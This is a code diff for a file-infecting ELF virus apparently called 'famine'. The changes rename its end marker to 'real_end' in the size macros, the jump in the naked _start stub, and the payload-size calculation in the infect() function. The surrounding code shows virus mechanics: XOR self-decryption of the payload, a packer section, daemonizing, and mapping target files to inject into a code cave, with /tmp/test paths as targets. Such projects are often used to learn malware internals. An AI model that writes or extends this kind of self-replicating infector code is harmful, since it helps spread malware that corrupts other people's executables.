@@ -25,12 +25,12 @@
  #define PATH2 "/tmp/test2"
 #endif
 
-#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
-#define PAYLOAD_SIZE (uintptr_t)&end - (uintptr_t)&real_start
+#define VIRUS_SIZE (uintptr_t)&real_end - (uintptr_t)&_start
+#define PAYLOAD_SIZE (uintptr_t)&real_end - (uintptr_t)&real_start
 #define PACKER_SIZE (uintptr_t)&real_start - (uintptr_t)&_start
 
-extern void end(void);
 extern int daemonize(void);
+extern void	real_end(void);
 
 void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
 void	jmp_end(void);
@@ -62,7 +62,7 @@ void __attribute__((naked)) _start(void)
 			"pop %rdx\n"
 			".global jmp_end\n"
 			"jmp_end:\n"
-			"jmp end\n"
+			"jmp real_end\n"
 	);
 }
 
@@ -111,7 +111,6 @@ void decrypt_self(void)
 
 	}
 
-	//uintptr_t dummy = (uintptr_t)&real_start;
 	void *start_addr = (void* )(uintptr_t)&real_start;
 	xor_decrypt(start_addr, PAYLOAD_SIZE, g_key);
 	return;
@@ -187,7 +186,7 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 	data.bs_data = bs_data;
 
 	/* calculate the size of the payload before the mapping */
-	data.cave.p_size = (uintptr_t)&end - (uintptr_t)&_start;
+	data.cave.p_size = (uintptr_t)&real_end - (uintptr_t)&_start;
 
 	if (map_file(filename, &data) != 0) {
 		return 1;
